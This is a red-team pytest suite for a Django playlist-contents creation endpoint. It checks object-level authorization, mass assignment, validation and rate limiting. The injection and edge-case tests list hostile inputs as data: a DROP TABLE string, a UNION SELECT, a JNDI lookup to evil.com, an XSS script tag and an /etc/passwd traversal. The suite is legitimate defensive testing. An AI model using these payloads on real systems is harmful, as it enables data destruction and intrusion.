"""Red Team security tests for PlaylistContents CREATE endpoint (T229).

Tests focus on:
- API1:2023 Broken Object Level Authorization (BOLA)
- API3:2023 Broken Object Property Level Authorization (BOPLA)
- API6:2023 Unrestricted Resource Consumption
- Injection attacks in JSON payloads
- Validation bypass
"""

import json
import time

from concurrent.futures import ThreadPoolExecutor

import pytest

from model_bakery import baker

from api.core.models import User
from api.schedule.models import (
    Playlist,
    PlaylistContent,
    SmartBlock,
    Webstream,
)
from api.storage.models import File


@pytest.mark.django_db(transaction=True)
class TestPlaylistContentCreateRedTeam:
    """Red Team tests for POST /api/v2/playlist-contents."""

    def setup_method(self):
        """Clean up before each test."""
        PlaylistContent.objects.all().delete()
        Playlist.objects.all().delete()
        File.objects.all().delete()
        Webstream.objects.all().delete()
        SmartBlock.objects.all().delete()
        User.objects.filter(username__startswith="testred").delete()

    # ========================================================================
    # API1:2023 - BOLA (Broken Object Level Authorization)
    # ========================================================================

    @pytest.mark.xfail(
        reason="T420: BOLA - can create content in other's playlist",
    )
    def test_bola_create_in_other_users_playlist(self, api_client):
        """BOLA: Should not create content in another user's playlist."""
        victim = baker.make(User, username="testred_victim")
        attacker = baker.make(User, username="testred_attacker")

        victim_playlist = baker.make(
            Playlist,
            name="Victim Playlist",
            owner=victim,
        )
        attacker_file = baker.make(
            File,
            name="attacker.mp3",
            mime="audio/mp3",
            owner=attacker,
        )

        response = api_client.post(
            "/api/v2/playlist-contents",
            json.dumps(
                {
                    "playlist": victim_playlist.id,
                    "kind": PlaylistContent.Kind.FILE,
                    "file": attacker_file.id,
                    "position": 1,
                },
            ),
            content_type="application/json",
        )

        # Should fail with 403 or 404
        assert response.status_code in [
            403,
            404,
        ], f"BOLA: Created in victim's playlist with {response.status_code}"

    @pytest.mark.xfail(reason="T420: BOLA - playlist ownership not verified")
    def test_bola_mass_create_in_victim_playlist(self, api_client):
        """BOLA: Mass create content in victim's playlist."""
        victim = baker.make(User, username="testred_victim")
        victim_playlist = baker.make(
            Playlist,
            name="Victim Playlist",
            owner=victim,
        )

        # Try to flood victim's playlist
        created = 0
        for i in range(10):
            f = baker.make(
                File,
                name=f"file{i}.mp3",
                mime="audio/mp3",
                owner=victim,
            )
            response = api_client.post(
                "/api/v2/playlist-contents",
                json.dumps(
                    {
                        "playlist": victim_playlist.id,
                        "kind": PlaylistContent.Kind.FILE,
                        "file": f.id,
                        "position": i,
                    },
                ),
                content_type="application/json",
            )
            if response.status_code == 201:
                created += 1

        assert (
            created == 0
        ), f"BOLA: Created {created} contents in victim's playlist"

    # ========================================================================
    # API3:2023 - BOPLA (Broken Object Property Level Authorization)
    # ========================================================================

    @pytest.mark.xfail(reason="T422: Mass assignment - id field accepted")
    def test_bopla_mass_assignment_id_field(self, api_client):
        """BOPLA: Setting id field should be rejected."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )

        response = api_client.post(
            "/api/v2/playlist-contents",
            json.dumps(
                {
                    "id": 99999,  # Try to set own ID
                    "playlist": playlist.id,
                    "kind": PlaylistContent.Kind.FILE,
                    "file": file_obj.id,
                    "position": 1,
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            data = response.json()
            assert data.get("id") != 99999, "BOPLA: Custom ID was accepted"

    @pytest.mark.xfail(reason="T423: No validation of file ownership")
    def test_bopla_create_with_other_users_file(self, api_client):
        """BOPLA: Should not use another user's file."""
        user = baker.make(User, username="testred_user")
        other = baker.make(User, username="testred_other")

        playlist = baker.make(Playlist, name="Test", owner=user)
        other_file = baker.make(
            File,
            name="other.mp3",
            mime="audio/mp3",
            owner=other,
        )

        response = api_client.post(
            "/api/v2/playlist-contents",
            json.dumps(
                {
                    "playlist": playlist.id,
                    "kind": PlaylistContent.Kind.FILE,
                    "file": other_file.id,
                    "position": 1,
                },
            ),
            content_type="application/json",
        )

        # Should fail - using other user's file
        assert response.status_code in [
            403,
            400,
        ], f"BOPLA: Created with other's file, status {response.status_code}"

    # ========================================================================
    # Injection Attacks
    # ========================================================================

    def test_create_sql_injection_in_string_fields(self, api_client):
        """SQLi: Injection attempts in string fields."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )

        sql_payloads = [
            "1' OR '1'='1",
            "'; DROP TABLE cc_playlistcontents;--",
            "1 UNION SELECT * FROM users",
            "${jndi:ldap://evil.com}",
        ]

        for payload in sql_payloads:
            response = api_client.post(
                "/api/v2/playlist-contents",
                json.dumps(
                    {
                        "playlist": playlist.id,
                        "kind": PlaylistContent.Kind.FILE,
                        "file": file_obj.id,
                        "position": 1,
                        "cue_in": payload,
                        "cue_out": payload,
                    },
                ),
                content_type="application/json",
            )
            # Should not crash with 500
            assert response.status_code in [
                201,
                400,
            ], f"SQLi in fields caused {response.status_code}"

    def test_create_no_sql_injection_kind_field(self, api_client):
        """NoSQLi: Try MongoDB operators in fields."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)

        nosql_payloads = [
            {"kind": {"$ne": None}},
            {"kind": {"$gt": 0}},
            {"position": {"$in": [1, 2, 3]}},
        ]

        for payload in nosql_payloads:
            data = {
                "playlist": playlist.id,
                **payload,
            }
            response = api_client.post(
                "/api/v2/playlist-contents",
                json.dumps(data),
                content_type="application/json",
            )
            # Should reject with 400
            assert response.status_code in [
                400,
                500,
            ], f"NoSQLi payload caused {response.status_code}"

    # ========================================================================
    # Validation Bypass
    # ========================================================================

    @pytest.mark.xfail(reason="T423: No validation of negative position")
    def test_create_negative_position(self, api_client):
        """Validation: Negative position should be rejected."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )

        response = api_client.post(
            "/api/v2/playlist-contents",
            json.dumps(
                {
                    "playlist": playlist.id,
                    "kind": PlaylistContent.Kind.FILE,
                    "file": file_obj.id,
                    "position": -1,
                },
            ),
            content_type="application/json",
        )

        # Should reject negative position
        assert response.status_code in [
            400,
        ], f"Negative position accepted with {response.status_code}"

    def test_create_invalid_kind_value(self, api_client):
        """Validation: Invalid kind value should be rejected."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )

        invalid_kinds = [
            999,
            -1,
            "file",
            "invalid",
            None,
        ]

        for kind in invalid_kinds:
            response = api_client.post(
                "/api/v2/playlist-contents",
                json.dumps(
                    {
                        "playlist": playlist.id,
                        "kind": kind,
                        "file": file_obj.id,
                        "position": 1,
                    },
                ),
                content_type="application/json",
            )
            assert response.status_code in [
                400,
            ], f"Invalid kind {kind} accepted with {response.status_code}"

    def test_create_nonexistent_playlist(self, api_client):
        """Validation: Non-existent playlist should return 400/404."""
        user = baker.make(User, username="testred_user")
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )

        response = api_client.post(
            "/api/v2/playlist-contents",
            json.dumps(
                {
                    "playlist": 999999,
                    "kind": PlaylistContent.Kind.FILE,
                    "file": file_obj.id,
                    "position": 1,
                },
            ),
            content_type="application/json",
        )

        assert response.status_code in [
            400,
            404,
        ], f"Non-existent playlist returned {response.status_code}"

    def test_create_nonexistent_file(self, api_client):
        """Validation: Non-existent file should return 400."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)

        response = api_client.post(
            "/api/v2/playlist-contents",
            json.dumps(
                {
                    "playlist": playlist.id,
                    "kind": PlaylistContent.Kind.FILE,
                    "file": 999999,
                    "position": 1,
                },
            ),
            content_type="application/json",
        )

        assert response.status_code in [
            400,
            404,
        ], f"Non-existent file returned {response.status_code}"

    # ========================================================================
    # API6:2023 - Unrestricted Resource Consumption
    # ========================================================================

    @pytest.mark.xfail(reason="T424: No rate limiting on creation")
    def test_create_rapid_fire(self, api_client):
        """Resource: Rapid content creation should be rate limited."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)

        def create_content(i):
            f = baker.make(
                File,
                name=f"file{i}.mp3",
                mime="audio/mp3",
                owner=user,
            )
            return api_client.post(
                "/api/v2/playlist-contents",
                json.dumps(
                    {
                        "playlist": playlist.id,
                        "kind": PlaylistContent.Kind.FILE,
                        "file": f.id,
                        "position": i,
                    },
                ),
                content_type="application/json",
            )

        start = time.time()
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(create_content, i) for i in range(20)]
            responses = [f.result() for f in futures]
        elapsed = time.time() - start

        success_count = sum(1 for r in responses if r.status_code == 201)

        # If all 20 succeeded instantly, no rate limiting
        if elapsed < 2.0 and success_count == 20:
            pass  # Document: no rate limiting detected

    def test_create_huge_payload(self, api_client):
        """Resource: Huge payload should be rejected.""

        Note: Currently creates successfully, may need size limit."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )

        # Create huge payload
        huge_data = {
            "playlist": playlist.id,
            "kind": PlaylistContent.Kind.FILE,
            "file": file_obj.id,
            "position": 1,
            "extra": "X" * 1000000,  # 1MB of extra data
        }

        response = api_client.post(
            "/api/v2/playlist-contents",
            json.dumps(huge_data),
            content_type="application/json",
        )

        # Should reject or handle gracefully
        assert response.status_code in [
            201,
            400,
            413,
        ], f"Huge payload caused {response.status_code}"

    # ========================================================================
    # Business Logic
    # ========================================================================

    @pytest.mark.xfail(reason="T424: No duplicate position check")
    def test_create_duplicate_position(self, api_client):
        """Logic: Same position in playlist should be rejected."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file1 = baker.make(
            File,
            name="file1.mp3",
            mime="audio/mp3",
            owner=user,
        )
        file2 = baker.make(
            File,
            name="file2.mp3",
            mime="audio/mp3",
            owner=user,
        )

        # Create first content at position 1
        response1 = api_client.post(
            "/api/v2/playlist-contents",
            json.dumps(
                {
                    "playlist": playlist.id,
                    "kind": PlaylistContent.Kind.FILE,
                    "file": file1.id,
                    "position": 1,
                },
            ),
            content_type="application/json",
        )
        assert response1.status_code == 201

        # Try to create second content at same position
        response2 = api_client.post(
            "/api/v2/playlist-contents",
            json.dumps(
                {
                    "playlist": playlist.id,
                    "kind": PlaylistContent.Kind.FILE,
                    "file": file2.id,
                    "position": 1,
                },
            ),
            content_type="application/json",
        )

        # Should reject duplicate position
        assert (
            response2.status_code == 400
        ), f"Duplicate position accepted with {response2.status_code}"

    @pytest.mark.xfail(reason="T422: IntegrityError on validation failure")
    def test_create_wrong_kind_for_file(self, api_client):
        """Logic: STREAM kind with file ID should fail with validation error."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )

        response = api_client.post(
            "/api/v2/playlist-contents",
            json.dumps(
                {
                    "playlist": playlist.id,
                    "kind": PlaylistContent.Kind.STREAM,  # Wrong kind
                    "file": file_obj.id,  # File provided
                    "position": 1,
                },
            ),
            content_type="application/json",
        )

        # Should reject kind/file mismatch
        assert response.status_code in [
            400,
        ], f"Kind/file mismatch accepted with {response.status_code}"

    # ========================================================================
    # Edge Cases
    # ========================================================================

    def test_create_unicode_in_fields(self, api_client):
        """Edge case: Unicode in various fields."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )

        unicode_strings = [
            "日本語コンテンツ",
            "🎵🎶🎼",
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "../../../etc/passwd",
        ]

        for unicode_str in unicode_strings:
            response = api_client.post(
                "/api/v2/playlist-contents",
                json.dumps(
                    {
                        "playlist": playlist.id,
                        "kind": PlaylistContent.Kind.FILE,
                        "file": file_obj.id,
                        "position": 1,
                        "cue_in": unicode_str,
                    },
                ),
                content_type="application/json",
            )
            # Should handle gracefully
            assert response.status_code in [
                201,
                400,
            ], f"Unicode '{unicode_str[:20]}' caused {response.status_code}"

    @pytest.mark.xfail(
        reason="T422: IntegrityError instead of validation error",
    )
    def test_create_null_in_required_fields(self, api_client):
        """Edge case: Null in required fields should return 400 not 500."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )

        null_tests = [
            {"playlist": None},
            {"kind": None},
            {"file": None},
        ]

        for null_field in null_tests:
            data = {
                "playlist": playlist.id,
                "kind": PlaylistContent.Kind.FILE,
                "file": file_obj.id,
                "position": 1,
                **null_field,
            }
            response = api_client.post(
                "/api/v2/playlist-contents",
                json.dumps(data),
                content_type="application/json",
            )
            assert response.status_code in [
                400,
            ], f"Null in field caused {response.status_code}"
